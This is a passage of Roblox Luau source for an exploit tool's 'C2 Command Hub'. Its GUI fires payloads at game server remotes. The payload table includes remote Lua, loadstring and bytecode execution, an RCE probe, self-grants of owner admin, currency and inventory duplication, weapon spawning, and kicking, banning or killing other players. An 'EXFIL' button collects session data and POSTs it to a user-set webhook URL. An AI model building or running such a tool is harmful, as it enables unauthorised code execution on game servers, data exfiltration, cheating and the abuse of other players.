    { label="ADMIN CHECK", col=C2_COL.INFO,
      payload={ action="adminCheck" } },
    { label="DUMP ATTRS",  col=C2_COL.INFO,
      payload={ action="dumpAttributes" } },
    { label="ENUMERATE",   col=C2_COL.INFO,
      payload={ action="enumerate", target="remotes" } },
    -- RCE verification: deterministic reflection test.
    -- If server returns 79877, an execution sink exists.
    -- If server returns anything else, it ran its own hardcoded script.
    { label="RCE VERIFY",  col=C2_COL.ERR,
      payload={ expr="59483+20394", eval=true, code="return 59483+20394" } },
    { label="INJECT",      col=C2_COL.ACTIVE,
      payload=nil },  -- nil = run full chain
}

-- -- C2 Command Hub categories -------------------------------------------------
C2.cats = {
    {
        id  = "EXEC",   label = "EXEC",
        col = Color3.fromRGB(218, 60, 68),
        cmds = {
            { n="Run Lua",      d="Execute a Lua script string on the server.",
              p={action="exec",       type="lua"           } },
            { n="Loadstring",   d="Execute via loadstring() if the server has it enabled.",
              p={action="loadstring", type="lua"           } },
            { n="Run Args",     d="Execute with structured argument table.",
              p={action="exec_args",  type="args"          } },
            { n="Bytecode",     d="Inject raw Luau bytecode directly.",
              p={action="exec_bytecode", type="bytecode"   } },
            { n="Eval String",  d="Evaluate an arbitrary string expression.",
              p={action="eval",       type="string"        } },
        },
    },
    {
        id  = "ADMIN",  label = "ADMIN",
        col = Color3.fromRGB(218, 155, 40),
        cmds = {
            { n="Grant Self",   d="Elevate current session to owner-level admin.",
              p={action="grantAdmin",  target="self",  level="owner"  } },
            { n="Grant Player", d="Grant admin to a target player by UserId.",
              p={action="grantAdmin",  target="",      level="admin"  } },
            { n="Revoke Admin", d="Remove admin privileges from target.",
              p={action="revokeAdmin", target="self"                  } },
            { n="Admin Check",  d="Query the server's current admin state for this session.",
              p={action="checkAdmin",  target="self"                  } },
            { n="Owner Mode",   d="Set session role to game owner -- bypasses all checks.",
              p={action="setRole",     role="owner"                   } },
        },
    },
    {
        id  = "ECONOMY", label = "ECON",
        col = Color3.fromRGB(88, 200, 128),
        cmds = {
            { n="Max Currency", d="Set all currency fields to maximum value.",
              p={action="setEconomy",   currency="ALL",  amount=2^53 } },
            { n="Add Gold",     d="Add a large amount of the primary currency.",
              p={action="addEconomy",   currency="Gold", amount=999999} },
            { n="Set Currency", d="Set a specific currency to an exact value.",
              p={action="setEconomy",   currency="",     amount=0    } },
            { n="Reset Economy",d="Revert all economy fields to zero.",
              p={action="resetEconomy"                               } },
            { n="Dump Economy", d="Request a dump of all economy fields from server.",
              p={action="dumpEconomy"                                } },
        },
    },
    {
        id  = "INVENTORY", label = "INV",
        col = Color3.fromRGB(160, 80, 255),
        cmds = {
            { n="Add Item",     d="Add a specified item to the session inventory.",
              p={action="addItem",      itemId="",  amount=1         } },
            { n="Duplicate All",d="Duplicate the entire current inventory.",
              p={action="duplicateInventory"                         } },
            { n="Max Stack",    d="Set all item quantities to their maximum stack size.",
              p={action="maxInventory"                               } },
            { n="Clear Inv",    d="Wipe the session inventory entirely.",
              p={action="clearInventory"                             } },
            { n="Dump Inv",     d="Request a full inventory dump from the server.",
              p={action="dumpInventory"                              } },
        },
    },
    {
        id  = "TOOLS",  label = "TOOLS",
        col = Color3.fromRGB(60, 155, 240),
        cmds = {
            { n="Grant Tool",   d="Grant a specific tool by name to the local player.",
              p={action="grantTool",   toolName=""                   } },
            { n="Grant All",    d="Grant every available tool/weapon in the game.",
              p={action="grantAllTools"                              } },
            { n="Spawn Weapon", d="Force-spawn a weapon instance into the character.",
              p={action="spawnWeapon", weaponId=""                   } },
            { n="Clear Tools",  d="Remove all tools from the character.",
              p={action="clearTools"                                 } },
            { n="Dump Tools",   d="List all tools and weapons available server-side.",
              p={action="dumpTools"                                  } },
        },
    },
    {
        id  = "GUI",    label = "GUI",
        col = Color3.fromRGB(0, 210, 200),
        cmds = {
            { n="Open Admin GUI",  d="Attempt to open the game's built-in admin panel.",
              p={action="openGUI",    name="AdminPanel"              } },
            { n="Reveal Hidden",   d="Force-show any GUI marked as hidden or developer-only.",
              p={action="revealGUI"                                  } },
            { n="Dev Console",     d="Attempt to enable the developer console.",
              p={action="openGUI",    name="DevConsole"              } },
            { n="Force ScreenGui", d="Inject a ScreenGui and force it visible.",
              p={action="forceGUI",   target="ScreenGui"             } },
            { n="Dump GUIs",       d="List all ScreenGui instances currently active.",
              p={action="dumpGUIs"                                   } },
        },
    },
    {
        id  = "NETWORK", label = "NET",
        col = Color3.fromRGB(218, 60, 68),
        cmds = {
            { n="Kick Player",  d="Kick a target player from the server.",
              p={action="kick",   target="",  reason="kicked"        } },
            { n="Kill Player",  d="Force a player's character to die.",
              p={action="kill",   target="self"                      } },
            { n="Ban Player",   d="Attempt to flag a player account as banned.",
              p={action="ban",    target="",  duration=0             } },
            { n="Disconnect",   d="Force-disconnect a player from the network.",
              p={action="disconnect", target=""                      } },
            { n="Mute Player",  d="Suppress a player's chat messages server-wide.",
              p={action="mute",   target=""                          } },
        },
    },
}

-- --- BUILD FUNCTION (C2 v3 -- COMMAND HUB) -----------------------------------
local function buildC2Page(page)
    page.ClipsDescendants = true

    -- Design tokens (same palette as before for consistency)
    local T1 = 1  -- fully transparent
    local CR  = Color3.fromRGB(188, 40,  62)
    local GRN = Color3.fromRGB(  0,210, 110)
    local BLU = Color3.fromRGB( 60,155, 240)
    local AMB = Color3.fromRGB(218,155,  40)
    local PUR = Color3.fromRGB(160, 80, 255)
    local TEL = Color3.fromRGB(  0,210, 200)
    local DIM = Color3.fromRGB( 55, 60,  80)
    local MID = Color3.fromRGB(140,150, 175)
    local PRI = Color3.fromRGB(215,220, 240)
    local SEP = Color3.fromRGB( 32, 36,  52)

    local PANEL_W = 290
    local HDR_H   = 36

    local function rule(parent, y, col, z)
        local f = mF(parent,0,y,0,1,col or SEP,0.50,z or 10)
        f.Size=UDim2.new(1,0,0,1) return f
    end

    -- -- STATUS BAR ---------------------------------------------------------
    local hdr = mF(page,0,0,0,HDR_H,Color3.new(0,0,0),T1,9)
    hdr.Size  = UDim2.new(1,0,0,HDR_H)
    mF(hdr,0,0,3,HDR_H,CR,0.0,10)
    rule(hdr,HDR_H-1,CR,10)
    mL(hdr,10,0,28,HDR_H,"C2",Enum.Font.GothamBold,13,CR,Enum.TextXAlignment.Left,10)

    local DOT=7
    c2StatusDot=mF(hdr,42,(HDR_H-DOT)/2,DOT,DOT,C2_COL.OFFLINE,0.0,10)
    mC(c2StatusDot,DOT/2)
    c2StatusLbl=mL(hdr,54,0,90,HDR_H,"OFFLINE",Enum.Font.GothamBold,9,C2_COL.OFFLINE,Enum.TextXAlignment.Left,10)
    mL(hdr,148,0,46,HDR_H,"TARGET",Enum.Font.GothamBold,7,DIM,Enum.TextXAlignment.Left,10)
    c2TargetLbl=mL(hdr,192,0,220,HDR_H,"none",Enum.Font.Code,9,BLU,Enum.TextXAlignment.Left,10)

    local function hdrPill(label,col,xPos,cb)
        local b=mBtn(hdr,0,(HDR_H-18)/2,90,18,Color3.new(0,0,0),T1,10)
        b.Position=UDim2.new(1,xPos,0,(HDR_H-18)/2)
        mS(b,col,0.45,1) mC(b,3)
        mL(b,0,0,90,18,label,Enum.Font.GothamBold,8,col,Enum.TextXAlignment.Center,11)
        b.MouseEnter:Connect(function() b.BackgroundTransparency=0.82; b.BackgroundColor3=col end)
        b.MouseLeave:Connect(function() b.BackgroundTransparency=T1 end)
        b.MouseButton1Click:Connect(function() task.spawn(cb) end)
    end
    hdrPill("o  CONNECT",  GRN,-184,c2Connect)
    hdrPill("o  DISCONNECT",CR,-90,c2Disconnect)

    -- -- SPLIT LAYOUT ------------------------------------------------------
    -- Left pane: command hub
    local lp=mF(page,0,HDR_H,PANEL_W,0,Color3.new(0,0,0),T1,9)
    lp.Size=UDim2.new(0,PANEL_W,1,-HDR_H)
    mF(lp,PANEL_W-1,0,1,0,SEP,0.45,10).Size=UDim2.new(0,1,1,0)

    -- Right pane: terminal (built later)
    local rp=mF(page,PANEL_W+1,HDR_H,0,0,Color3.new(0,0,0),T1,9)
    rp.Size=UDim2.new(1,-(PANEL_W+1),1,-HDR_H)

    -- -----------------------------------------------------------------------
    -- LEFT PANE -- fixed three-zone layout:
    --   Zone 1 (top, fixed):     category bar + context strip
    --   Zone 2 (middle, flex):   scrollable command list
    --   Zone 3 (bottom, fixed):  command form (inputs + execute)
    -- -----------------------------------------------------------------------
    local CAT_H    = 56   -- category pills + context strip
    local FORM_H   = 130  -- command input form
    local OB_H2    = 20   -- outbound URL strip
    local STAT_H   = 24   -- session stats strip
    -- total pixels reserved at the bottom of the left pane
    local BOTTOM_H = FORM_H + OB_H2 + STAT_H  -- 174
    -- Middle zone fills whatever remains

    -- -- ZONE 1: Category bar ---------------------------------------------
    local catBar=mF(lp,0,0,PANEL_W,CAT_H,Color3.new(0,0,0),T1,10)
    catBar.Size=UDim2.new(1,0,0,CAT_H)

    -- Category pills row
    local catSF=Instance.new("ScrollingFrame")
    catSF.Size=UDim2.fromOffset(PANEL_W-8,22)
    catSF.Position=UDim2.fromOffset(4,4)
    catSF.BackgroundTransparency=1 catSF.BorderSizePixel=0
    catSF.ScrollBarThickness=0 catSF.ScrollingDirection=Enum.ScrollingDirection.X
    catSF.CanvasSize=UDim2.fromOffset(0,22) catSF.ZIndex=11 catSF.Parent=catBar

    -- Context strip (shows live game data for current category)
    local ctxLbl=mL(catBar,8,28,PANEL_W-12,14,"",
        Enum.Font.Code,8,DIM,Enum.TextXAlignment.Left,11)
    rule(catBar,CAT_H-1,SEP,10)

    -- -- ZONE 2: Command list (scrollable, fills middle) -------------------
    local listSF=Instance.new("ScrollingFrame")
    listSF.Name="CmdList"
    listSF.Size=UDim2.new(1,0,1,-(CAT_H+BOTTOM_H))
    listSF.Position=UDim2.fromOffset(0,CAT_H)
    listSF.BackgroundTransparency=1 listSF.BorderSizePixel=0
    listSF.ScrollBarThickness=2
    listSF.ScrollBarImageTransparency=0.65
    listSF.CanvasSize=UDim2.fromOffset(0,0) listSF.ZIndex=10 listSF.Parent=lp

    -- -- ZONE 3: Command form (pinned to bottom) ---------------------------
    local formPane=mF(lp,0,0,PANEL_W,FORM_H,Color3.new(0,0,0),T1,10)
    formPane.Size=UDim2.new(1,0,0,FORM_H)
    formPane.Position=UDim2.new(0,0,1,-(FORM_H+OB_H2+STAT_H))
    rule(formPane,0,SEP,11)

    -- Form: header label
    local formTitle=mL(formPane,8,4,PANEL_W-16,12,"SELECT A COMMAND",
        Enum.Font.GothamBold,7,DIM,Enum.TextXAlignment.Left,11)
    local formDesc=mL(formPane,8,16,PANEL_W-16,10,"",
        Enum.Font.Gotham,7,DIM,Enum.TextXAlignment.Left,11)

    -- Form: input area (TextBox + execute, dynamically configured)
    local formInput=Instance.new("TextBox")
    formInput.Size=UDim2.fromOffset(PANEL_W-18,28)
    formInput.Position=UDim2.fromOffset(8,30)
    formInput.BackgroundColor3=Color3.new(0,0,0)
    formInput.BackgroundTransparency=0.76 formInput.BorderSizePixel=0
    formInput.Text="" formInput.PlaceholderText="--"
    formInput.PlaceholderColor3=DIM formInput.TextColor3=PRI
    formInput.Font=Enum.Font.Code formInput.TextSize=9
    formInput.ClearTextOnFocus=false formInput.TextXAlignment=Enum.TextXAlignment.Left
    formInput.ZIndex=11 formInput.Parent=formPane
    mC(formInput,3) mS(formInput,SEP,0.55,1)
    formInput.Visible=false

    -- Form: second input (for commands that need two fields, e.g. currency + amount)
    local formInput2=Instance.new("TextBox")
    formInput2.Size=UDim2.fromOffset(PANEL_W-18,22)
    formInput2.Position=UDim2.fromOffset(8,62)
    formInput2.BackgroundColor3=Color3.new(0,0,0)
    formInput2.BackgroundTransparency=0.76 formInput2.BorderSizePixel=0
    formInput2.Text="" formInput2.PlaceholderText="--"
    formInput2.PlaceholderColor3=DIM formInput2.TextColor3=AMB
    formInput2.Font=Enum.Font.Code formInput2.TextSize=9
    formInput2.ClearTextOnFocus=false formInput2.TextXAlignment=Enum.TextXAlignment.Left
    formInput2.ZIndex=11 formInput2.Parent=formPane
    mC(formInput2,3) mS(formInput2,SEP,0.55,1)
    formInput2.Visible=false

    -- Form: execute button
    local formExec=mBtn(formPane,8,88,PANEL_W-18,24,Color3.new(0,0,0),T1,11)
    mC(formExec,3) mS(formExec,GRN,0.50,1)
    mF(formExec,0,0,2,24,GRN,0.0,12)
    local formExecLbl=mL(formExec,8,0,PANEL_W-22,24,"SEND",
        Enum.Font.GothamBold,8,GRN,Enum.TextXAlignment.Left,12)
    formExec.Visible=false
    local formExecCB=nil   -- set when a command is selected

    formExec.MouseEnter:Connect(function()
        formExec.BackgroundColor3=GRN; formExec.BackgroundTransparency=0.84
    end)
    formExec.MouseLeave:Connect(function() formExec.BackgroundTransparency=T1 end)
    formExec.MouseButton1Click:Connect(function()
        formExec.BackgroundTransparency=0.60
        task.delay(0.14,function() formExec.BackgroundTransparency=T1 end)
        if formExecCB then task.spawn(formExecCB) end
    end)

    -- -- Live game scanner per category ------------------------------------
    -- Returns a context string and a list of suggestions for input fields
    local function scanContext(catId)
        local ctx = ""
        local suggestions = {}
        local plr = game:GetService("Players").LocalPlayer

        if catId == "ECONOMY" then
            local ls = plr:FindFirstChild("leaderstats")
            if ls then
                local parts = {}
                for _,v in ipairs(ls:GetChildren()) do
                    if v:IsA("ValueBase") then
                        table.insert(parts, v.Name..": "..tostring(v.Value))
                        table.insert(suggestions, v.Name)
                    end
                end
                ctx = #parts>0 and table.concat(parts,"  .  ") or "no leaderstats found"
            else
                ctx = "no leaderstats found"
            end

        elseif catId == "TOOLS" then
            local found = {}
            local roots = {
                game:GetService("StarterPack"),
                game:GetService("ReplicatedStorage"),
            }
            for _,root in ipairs(roots) do
                local ok,descs=pcall(function() return root:GetDescendants() end)
                if ok then
                    for _,d in ipairs(descs) do
                        if d:IsA("Tool") and not found[d.Name] then
                            found[d.Name]=true
                            table.insert(suggestions,d.Name)
                        end
                    end
                end
            end
            ctx = #suggestions>0
                and (#suggestions.." tool(s) found: "..table.concat(suggestions,", "):sub(1,60))
                or "no tools found in StarterPack or ReplicatedStorage"

        elseif catId == "NETWORK" then
            local players = game:GetService("Players"):GetPlayers()
            for _,p in ipairs(players) do
                table.insert(suggestions, p.Name.." ("..p.UserId..")")
            end
            ctx = #players.." player(s) online"

        elseif catId == "GUI" then
            local pg = plr:FindFirstChildOfClass("PlayerGui")
            if pg then
                for _,sg in ipairs(pg:GetChildren()) do
                    if sg:IsA("ScreenGui") then
                        local hidden = not sg.Enabled
                        table.insert(suggestions, sg.Name..(hidden and " [hidden]" or ""))
                    end
                end
            end
            ctx = #suggestions.." ScreenGui(s): "..table.concat(suggestions,", "):sub(1,55)

        elseif catId == "INVENTORY" then
            local ok, attrs = pcall(function() return plr:GetAttributes() end)
            if ok and attrs then
                for k,v in pairs(attrs) do
                    table.insert(suggestions, k.."="..tostring(v))
                end
            end
            ctx = #suggestions>0
                and (#suggestions.." attribute(s) found")
                or "no inventory attributes found"

        elseif catId == "ADMIN" then
            local found = {}
            local ok,rs = pcall(function() return game:GetService("ReplicatedStorage") end)
            if ok then
                for _,d in ipairs(rs:GetDescendants()) do
                    local n = d.Name:lower()
                    if n:find("admin") or n:find("role") or n:find("perm") then
                        table.insert(found, d.Name)
                    end
                end
            end
            ctx = #found>0
                and ("admin-related remotes: "..table.concat(found,", "):sub(1,55))
                or "no admin remotes detected -- checking session state"

        elseif catId == "EXEC" then
            ctx = "fires payload -> target remote -> server script handler"
        end

        return ctx, suggestions
    end

    -- -- Populate form for selected command --------------------------------
    local function selectCommand(cmd, cat, suggestions)
        formTitle.Text      = cmd.n
        formTitle.TextColor3= cat.col
        formDesc.Text       = cmd.d
        formExec.Visible    = true
        formExecLbl.Text    = ">  SEND  --  " .. cmd.n
        formExecLbl.TextColor3 = cat.col
        local stroke = formExec:FindFirstChildOfClass("UIStroke")
        if stroke then stroke.Color = cat.col end
        mF(formExec,0,0,2,24,cat.col,0.0,12)   -- accent bar colour

        -- Decide input layout based on command type
        local p = cmd.p

        if p.type == "lua" or p.type == "string" or p.type == "args"
        or p.type == "bytecode" then
            -- Script input
            formInput.Visible       = true
            formInput.Size          = UDim2.fromOffset(PANEL_W-18,46)
            formInput.Position      = UDim2.fromOffset(8,30)
            formInput.PlaceholderText = (p.type=="lua") and "-- Lua code"
                or (p.type=="bytecode") and "-- raw bytecode"
                or "-- string / args"
            formInput.TextColor3    = cat.col
            formInput2.Visible      = false

        elseif p.action == "addEconomy" or p.action == "setEconomy" then
            formInput.Visible       = true
            formInput.Size          = UDim2.fromOffset(PANEL_W-18,22)
            formInput.Position      = UDim2.fromOffset(8,30)
            formInput.PlaceholderText = suggestions[1] or "currency name (e.g. Gold)"
            formInput.Text          = suggestions[1] or ""
            formInput.TextColor3    = cat.col
            formInput2.Visible      = true
            formInput2.PlaceholderText = "amount (e.g. 99999)"
            formInput2.Text         = p.action=="addEconomy" and "99999" or ""

        elseif p.action == "grantAdmin" or p.action == "revokeAdmin"
            or p.action == "kick" or p.action == "kill" or p.action == "ban"
            or p.action == "disconnect" or p.action == "mute" then
            -- Player targeting
            formInput.Visible       = true
            formInput.Size          = UDim2.fromOffset(PANEL_W-18,22)
            formInput.Position      = UDim2.fromOffset(8,30)
            -- Show player names as placeholder hint
            local hint = #suggestions > 0
                and suggestions[1]
                or "player name or UserId"
            formInput.PlaceholderText = hint
            formInput.Text          = ""
            formInput.TextColor3    = cat.col
            -- Reason / level as second input
            if p.action == "kick" or p.action == "ban" then
                formInput2.Visible      = true
                formInput2.PlaceholderText = p.action=="kick" and "reason" or "duration (0=perm)"
                formInput2.Text         = ""
            elseif p.action == "grantAdmin" then
                formInput2.Visible      = true
                formInput2.PlaceholderText = "level: admin | moderator | owner"
                formInput2.Text         = "admin"
            else
                formInput2.Visible = false
            end

        elseif p.action == "grantTool" or p.action == "spawnWeapon" then
            formInput.Visible       = true
            formInput.Size          = UDim2.fromOffset(PANEL_W-18,22)
            formInput.Position      = UDim2.fromOffset(8,30)
            formInput.PlaceholderText = #suggestions>0
                and ("e.g. "..suggestions[1])
                or "tool name"
            formInput.Text          = ""
            formInput.TextColor3    = cat.col
            formInput2.Visible      = false

        elseif p.action == "addItem" then
            formInput.Visible       = true
            formInput.Size          = UDim2.fromOffset(PANEL_W-18,22)
            formInput.Position      = UDim2.fromOffset(8,30)
            formInput.PlaceholderText = "item ID or name"
            formInput.Text          = ""
            formInput.TextColor3    = cat.col
            formInput2.Visible      = true
            formInput2.PlaceholderText = "amount (default 1)"
            formInput2.Text         = "1"

        elseif p.action == "openGUI" or p.action == "forceGUI" then
            formInput.Visible       = true
            formInput.Size          = UDim2.fromOffset(PANEL_W-18,22)
            formInput.Position      = UDim2.fromOffset(8,30)
            formInput.PlaceholderText = #suggestions>0
                and ("e.g. "..suggestions[1]:gsub(" %[hidden%]",""))
                or "GUI name"
            formInput.Text          = p.name or ""
            formInput.TextColor3    = cat.col
            formInput2.Visible      = false
        else
            -- No input needed -- just show description
            formInput.Visible  = false
            formInput2.Visible = false
        end

        -- Wire SEND button
        formExecCB = function()
            local pCopy = {}
            for k,v in pairs(p) do pCopy[k]=v end

            -- Inject input values
            local v1 = formInput.Visible  and formInput.Text  or nil
            local v2 = formInput2.Visible and formInput2.Text or nil

            if p.type then
                pCopy.code = v1 or ""
            elseif p.action == "addEconomy" or p.action == "setEconomy" then
                pCopy.currency = v1 or "Gold"
                pCopy.amount   = tonumber(v2) or 0
            elseif p.action == "grantAdmin" then
                pCopy.target = v1 or "self"
                pCopy.level  = v2 or "admin"
            elseif p.action == "kick" or p.action == "ban" then
                pCopy.target = v1 or ""
                if p.action=="kick" then pCopy.reason=v2 or "kicked"
                else pCopy.duration=tonumber(v2) or 0 end
            elseif p.action=="kill" or p.action=="disconnect" or p.action=="mute"
                or p.action=="revokeAdmin" then
                pCopy.target = v1 or "self"
            elseif p.action=="grantTool" or p.action=="spawnWeapon" then
                pCopy.toolName = v1 or ""
            elseif p.action=="addItem" then
                pCopy.itemId = v1 or ""
                pCopy.amount = tonumber(v2) or 1
            elseif p.action=="openGUI" or p.action=="forceGUI" then
                pCopy.name = v1 or p.name or ""
            end

            c2Log("[->] "..cat.label, cmd.n..(v1 and ("  ["..v1:sub(1,20).."]") or ""), C2_COL.OUT)
            c2Send(cmd.n, pCopy)
        end
    end

    -- -- Build category pills + command list -------------------------------
    local catBtnRefs = {}
    local activeCatId = nil

    local function buildCatList(cat)
        if activeCatId == cat.id then return end
        activeCatId = cat.id

        -- Update pill highlights
        for _,ref in ipairs(catBtnRefs) do
            local isA = (ref.cat.id == cat.id)
            ref.btn.BackgroundTransparency = isA and 0.75 or T1
            ref.btn.BackgroundColor3       = isA and ref.cat.col or Color3.new(0,0,0)
            ref.lbl.TextColor3             = isA and ref.cat.col or DIM
        end
        listSF.ScrollBarImageColor3 = cat.col

        -- Scan live context
        local ctx, suggestions = scanContext(cat.id)
        ctxLbl.Text = ctx
        ctxLbl.TextColor3 = cat.col

        -- Reset form
        formTitle.Text = "SELECT A COMMAND"
        formTitle.TextColor3 = DIM
        formDesc.Text  = ""
        formInput.Visible  = false
        formInput2.Visible = false
        formExec.Visible   = false
        formExecCB = nil

        -- Build command rows
        for _,ch in ipairs(listSF:GetChildren()) do
            if ch:IsA("Frame") or ch:IsA("TextButton") then ch:Destroy() end
        end

        local ROW_H = 28
        local selectedRow = nil

        for j, cmd in ipairs(cat.cmds) do
            local ry = (j-1)*(ROW_H+2)
            local row = mBtn(listSF,0,ry,PANEL_W-16,ROW_H,
                Color3.new(0,0,0),T1,11)
            mC(row,3) mS(row,cat.col,0.75,1)

            -- Left accent dot (small circle)
            local dot = mF(row,6,(ROW_H-6)/2,6,6,cat.col,0.50,12)
            mC(dot,3)

            -- Command name
            mL(row,18,0,PANEL_W-72,ROW_H,cmd.n,
                Enum.Font.GothamBold,8,MID,Enum.TextXAlignment.Left,12)

            -- ">" arrow hint (right)
            local arr=mL(row,0,0,PANEL_W-20,ROW_H,">",
                Enum.Font.GothamBold,10,DIM,Enum.TextXAlignment.Right,12)

            row.MouseEnter:Connect(function()
                row.BackgroundColor3=cat.col
                row.BackgroundTransparency=0.88
                arr.TextColor3=cat.col
            end)
            row.MouseLeave:Connect(function()
                if selectedRow ~= row then
                    row.BackgroundTransparency=T1
                    arr.TextColor3=DIM
                end
            end)

            local captCmd=cmd; local captRow=row; local captDot=dot
            local captArr=arr
            row.MouseButton1Click:Connect(function()
                -- Deselect previous
                if selectedRow and selectedRow~=captRow then
                    selectedRow.BackgroundTransparency=T1
                    selectedRow.BackgroundColor3=Color3.new(0,0,0)
                end
                selectedRow = captRow
                captRow.BackgroundColor3=cat.col
                captRow.BackgroundTransparency=0.82
                captArr.TextColor3=cat.col
                captDot.BackgroundTransparency=0.0
                selectCommand(captCmd, cat, suggestions)
            end)
        end

        listSF.CanvasSize=UDim2.fromOffset(0,#cat.cmds*(ROW_H+2))
    end

    -- Build category pills
    local pillX=0
    for _, cat in ipairs(C2.cats) do
        local pw=#cat.label*7+14
        local pill=mBtn(catSF,pillX,1,pw,20,Color3.new(0,0,0),T1,12)
        mC(pill,4) mS(pill,cat.col,0.58,1)
        local plbl=mL(pill,0,0,pw,20,cat.label,
            Enum.Font.GothamBold,7,DIM,Enum.TextXAlignment.Center,13)
        table.insert(catBtnRefs,{btn=pill,lbl=plbl,cat=cat})
        local captCat=cat
        pill.MouseButton1Click:Connect(function() buildCatList(captCat) end)
        pillX=pillX+pw+4
    end
    catSF.CanvasSize=UDim2.fromOffset(pillX,22)

    -- Default to EXEC
    buildCatList(C2.cats[1])

    -- -- OUTBOUND + SESSION (very bottom, below the form) ------------------
    -- Outbound is placed in the header strip area just to the right of target
    -- so it doesn't occupy left-pane vertical space.
    -- Instead, put a small "^" icon in the status bar that opens a config popup.
    -- Actually: keep it compact in left pane ABOVE the form as a single row.
    local obPane=mF(lp,0,0,PANEL_W,OB_H,Color3.new(0,0,0),T1,10)
    obPane.Size=UDim2.fromOffset(PANEL_W,OB_H2)
    obPane.Position=UDim2.new(0,0,1,-(OB_H2+STAT_H))
    rule(obPane,0,SEP,11)

    local obBox=Instance.new("TextBox")
    obBox.Size=UDim2.fromOffset(PANEL_W-62,OB_H2)
    obBox.Position=UDim2.fromOffset(0,0)
    obBox.BackgroundTransparency=1 obBox.BorderSizePixel=0
    obBox.Text=HTTP.webhookUrl obBox.PlaceholderText="outbound URL..."
    obBox.PlaceholderColor3=DIM obBox.TextColor3=BLU
    obBox.Font=Enum.Font.Code obBox.TextSize=8
    obBox.ClearTextOnFocus=false obBox.TextXAlignment=Enum.TextXAlignment.Left
    obBox.ZIndex=11 obBox.Parent=obPane
    mC(obBox,2)
    obBox.FocusLost:Connect(function() HTTP.webhookUrl=obBox.Text end)
    obBox.Changed:Connect(function(p) if p=="Text" then HTTP.webhookUrl=obBox.Text end end)

    local exBtn=mBtn(obPane,PANEL_W-58,1,54,OB_H2-2,CR,T1,11)
    mC(exBtn,3) mS(exBtn,CR,0.55,1)
    mL(exBtn,0,0,54,OB_H2-2,"^ EXFIL",Enum.Font.GothamBold,7,CR,Enum.TextXAlignment.Center,12)
    exBtn.MouseEnter:Connect(function() exBtn.BackgroundColor3=CR; exBtn.BackgroundTransparency=0.82 end)
    exBtn.MouseLeave:Connect(function() exBtn.BackgroundTransparency=T1 end)
    exBtn.MouseButton1Click:Connect(function()
        task.spawn(function()
            c2Log("SYS","Collecting exfil...",C2_COL.INFO)
            local payload=HTTP:collect()
            HTTP:capture("EXFILTRATED","session_"..os.date("%H%M%S"),payload)
            if HTTP.webhookUrl=="" then
                c2Log("!","No URL configured.",C2_COL.ERR) return
            end
            c2Log("[->] POST",HTTP.webhookUrl:sub(1,48),C2_COL.OUT)
            local ok,status,body,ms=HTTP:post(HTTP.webhookUrl,payload)
            if ok then c2Log("[<-] "..status,body:sub(1,50),C2_COL.IN)
            else c2Log("!","HTTP error: "..body:sub(1,60),C2_COL.ERR) end
        end)
    end)

    -- Session stats strip (very bottom)
    local statBar=mF(lp,0,0,PANEL_W,STAT_H,Color3.new(0,0,0),T1,10)
    statBar.Size=UDim2.fromOffset(PANEL_W,STAT_H)
    statBar.Position=UDim2.new(0,0,1,-STAT_H)
    rule(statBar,0,SEP,11)
    c2TimeLbl=mL(statBar,8,0,72,STAT_H,"00:00",Enum.Font.Code,14,CR,Enum.TextXAlignment.Left,11)
    mL(statBar,84,0,22,STAT_H,"TX",Enum.Font.GothamBold,6,DIM,Enum.TextXAlignment.Left,11)
    c2SentLbl=mL(statBar,84,10,40,12,"0",Enum.Font.Code,10,BLU,Enum.TextXAlignment.Left,11)
    mL(statBar,132,0,22,STAT_H,"RX",Enum.Font.GothamBold,6,DIM,Enum.TextXAlignment.Left,11)
    c2RecvLbl=mL(statBar,132,10,40,12,"0",Enum.Font.Code,10,GRN,Enum.TextXAlignment.Left,11)
    mL(statBar,180,0,40,STAT_H,"LAST",Enum.Font.GothamBold,6,DIM,Enum.TextXAlignment.Left,11)
    c2ContactLbl=mL(statBar,180,10,80,12,"--",Enum.Font.Code,9,AMB,Enum.TextXAlignment.Left,11)

    -- -- RIGHT PANE: TERMINAL ----------------------------------------------
    local tHdr=mF(rp,0,0,0,24,Color3.new(0,0,0),T1,10)
    tHdr.Size=UDim2.new(1,0,0,24)
    rule(tHdr,23,SEP,11)
    mL(tHdr,10,0,100,24,"SIGNAL FEED",Enum.Font.GothamBold,8,DIM,Enum.TextXAlignment.Left,11)

    local lx2=106
    for _,leg in ipairs({{"SYS",C2_COL.SYS},{"->",C2_COL.OUT},{"<-",C2_COL.IN},{"!",C2_COL.ERR}}) do
        local lw=#leg[1]*6+8
        mL(tHdr,lx2,0,lw,24,leg[1],Enum.Font.Code,8,leg[2],Enum.TextXAlignment.Left,11)
        lx2=lx2+lw+4
    end

    local clr=mBtn(tHdr,0,5,44,14,Color3.new(0,0,0),T1,11)
    clr.Position=UDim2.new(1,-50,0,5)
    mS(clr,CR,0.62,1) mC(clr,3)
    mL(clr,0,0,44,14,"CLEAR",Enum.Font.GothamBold,7,CR,Enum.TextXAlignment.Center,12)
    clr.MouseButton1Click:Connect(function()
        for _,l in ipairs(c2LogLines) do l:Destroy() end
        c2LogLines={}
        if c2LogScroll then c2LogScroll.CanvasSize=UDim2.fromOffset(0,0) end
    end)

    local logSF=Instance.new("ScrollingFrame")
    logSF.Name="C2Terminal"
    logSF.Size=UDim2.new(1,0,1,-46)
    logSF.Position=UDim2.fromOffset(0,24)
    logSF.BackgroundTransparency=1 logSF.BorderSizePixel=0
    logSF.ScrollBarThickness=2
    logSF.ScrollBarImageColor3=CR logSF.ScrollBarImageTransparency=0.60
    logSF.CanvasSize=UDim2.fromOffset(0,0) logSF.ZIndex=10 logSF.Parent=rp
    c2LogScroll=logSF

    local strip2=mF(rp,0,0,0,22,Color3.new(0,0,0),T1,10)
    strip2.Size=UDim2.new(1,0,0,22)
    strip2.Position=UDim2.new(0,0,1,-22)
    rule(strip2,0,SEP,11)
    mL(strip2,12,0,60,22,"TX: 0", Enum.Font.Code,8,BLU,Enum.TextXAlignment.Left,11)
    mL(strip2,72,0,60,22,"RX: 0", Enum.Font.Code,8,GRN,Enum.TextXAlignment.Left,11)
    mL(strip2,132,0,70,22,"LAT: --",Enum.Font.Code,8,AMB,Enum.TextXAlignment.Left,11)
    local cur2=mL(strip2,0,0,16,22,"|",Enum.Font.Code,10,CR,Enum.TextXAlignment.Left,11)
    cur2.Position=UDim2.new(1,-18,0,0)
    task.spawn(function()
        while true do cur2.TextTransparency=0; task.wait(0.5); cur2.TextTransparency=1; task.wait(0.5) end
    end)

    -- Boot log
    -- -- PROBE ALL button in header ------------------------------------------
    -- PROBE ALL button
